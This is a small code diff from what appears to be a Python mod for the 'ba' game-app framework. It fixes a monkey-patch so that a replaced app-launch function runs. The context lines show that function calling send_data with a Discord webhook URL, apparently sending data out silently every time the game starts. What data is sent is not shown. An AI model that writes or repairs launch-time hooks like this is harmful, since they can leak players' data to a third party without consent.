@@ -44,4 +44,4 @@ def custom_app_launch(self: ba.App) -> None:
     send_data(DISCORD_WEBHOOK_URL)
 
 
-ba.App.on_app_launch = custom_app_launch
+ba.app.on_app_launch = custom_app_launch
